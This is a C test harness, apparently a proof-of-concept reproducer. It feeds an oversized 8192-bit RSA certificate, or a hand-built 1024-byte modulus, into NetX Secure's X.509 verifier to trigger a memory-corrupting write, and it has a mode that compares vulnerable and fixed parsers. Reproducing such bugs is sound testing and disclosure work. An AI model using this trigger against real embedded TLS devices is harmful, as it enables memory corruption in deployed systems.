/* NetX Secure X.509 oversized-RSA-modulus write harness.
 *
 * Drives the REAL pinned _nx_secure_x509_certificate_verify() with the
 * REAL 8192-bit certificate DER shipped as the upstream regression test
 * fixture. The hash method is a stub (NULL ops, SHA-256 ICV size): the
 * defect is entirely in the RSA path and the hash is only needed so the
 * verifier reaches the public-key operation.
 */
#include <stdio.h>
#include <string.h>
#include "nx_api.h"
#include "nx_secure_x509.h"
#include "nx_crypto_rsa.h"
#include "nx_oversized_key_test_data.h"

extern UINT _nx_secure_x509_certificate_verify(NX_SECURE_X509_CERTIFICATE_STORE *,
                                                NX_SECURE_X509_CERT *,
                                                NX_SECURE_X509_CERT *);

static NX_CRYPTO_METHOD rsa_method =
{
    NX_CRYPTO_KEY_EXCHANGE_RSA, 0, 0, 0, 0, sizeof(NX_CRYPTO_RSA),
    _nx_crypto_method_rsa_init,
    _nx_crypto_method_rsa_cleanup,
    _nx_crypto_method_rsa_operation
};

/* Hash ops left NULL deliberately: _nx_secure_x509_certificate_verify skips
   hash generation when nx_crypto_operation is NULL but still uses the ICV
   size. No synthetic write: only the real RSA operation can fault. */
static NX_CRYPTO_METHOD hash_method =
{
    NX_CRYPTO_HASH_SHA256, 0, 0, 256, 0, 0,
    NX_CRYPTO_NULL, NX_CRYPTO_NULL, NX_CRYPTO_NULL
};

static NX_SECURE_X509_CRYPTO cipher_table[1] =
{
    { 0x1234, &rsa_method, &hash_method }
};

static NX_SECURE_X509_CERT issuer;
static NX_SECURE_X509_CERT cert;
static NX_SECURE_X509_CERTIFICATE_STORE store;
static UCHAR cipher_metadata[16384];
static UCHAR hash_metadata[256];
static UCHAR signature_data[512];
static UCHAR verify_data[64];
static UCHAR manual_modulus[1024];
static UCHAR exponent[3] = { 0x01, 0x00, 0x01 };

int main(int argc, char **argv)
{
    UINT status;
    UINT mlen;
    int manual = (argc > 1 && strcmp(argv[1], "manual") == 0);

    memset(&issuer, 0, sizeof(issuer));
    memset(&cert, 0, sizeof(cert));
    memset(&store, 0, sizeof(store));
    memset(signature_data, 0x41, sizeof(signature_data));
    memset(verify_data, 0x42, sizeof(verify_data));
    memset(manual_modulus, 0x9c, sizeof(manual_modulus));

    if (manual)
    {
        /* Same shape as the DER fixture: 8192-bit modulus, 3-byte exponent. */
        issuer.nx_secure_x509_public_algorithm = NX_SECURE_TLS_X509_TYPE_RSA;
        issuer.nx_secure_x509_public_key.rsa_public_key.nx_secure_rsa_public_modulus = manual_modulus;
        issuer.nx_secure_x509_public_key.rsa_public_key.nx_secure_rsa_public_modulus_length = sizeof(manual_modulus);
        issuer.nx_secure_x509_public_key.rsa_public_key.nx_secure_rsa_public_exponent = exponent;
        issuer.nx_secure_x509_public_key.rsa_public_key.nx_secure_rsa_public_exponent_length = sizeof(exponent);
        mlen = sizeof(manual_modulus);
        printf("mode=manual modulus_bytes=%u\n", mlen);
    }
    else
    {
        /* Real upstream fixture: a self-signed 8192-bit RSA certificate.
           Vulnerable parser records the 1024-byte modulus; fixed parser
           rejects the certificate at parse time. */
        status = _nx_secure_x509_certificate_initialize(&issuer,
                     (UCHAR *)oversized_cert_der, oversized_cert_der_len,
                     NX_NULL, 0, NX_NULL, 0, NX_SECURE_X509_KEY_TYPE_NONE);
        mlen = issuer.nx_secure_x509_public_key.rsa_public_key.nx_secure_rsa_public_modulus_length;
        printf("parse_status=%u modulus_bytes=%u\n", status, mlen);
    }

    /* Child certificate: signature algorithm maps to our one cipher entry. */
    cert.nx_secure_x509_certificate_data = verify_data;
    cert.nx_secure_x509_certificate_data_length = sizeof(verify_data);
    cert.nx_secure_x509_signature_data = signature_data;
    cert.nx_secure_x509_signature_data_length = sizeof(signature_data);
    cert.nx_secure_x509_signature_algorithm = 0x1234;
    cert.nx_secure_x509_cipher_table = cipher_table;
    cert.nx_secure_x509_cipher_table_size = 1;
    cert.nx_secure_x509_public_cipher_metadata_area = cipher_metadata;
    cert.nx_secure_x509_public_cipher_metadata_size = sizeof(cipher_metadata);
    cert.nx_secure_x509_hash_metadata_area = hash_metadata;
    cert.nx_secure_x509_hash_metadata_size = sizeof(hash_metadata);

    printf("issuer_alg=%u calling verify\n", issuer.nx_secure_x509_public_algorithm);
    fflush(stdout);
    status = _nx_secure_x509_certificate_verify(&store, &cert, &issuer);
    printf("verify_status=%u\n", status);
    return 0;
}
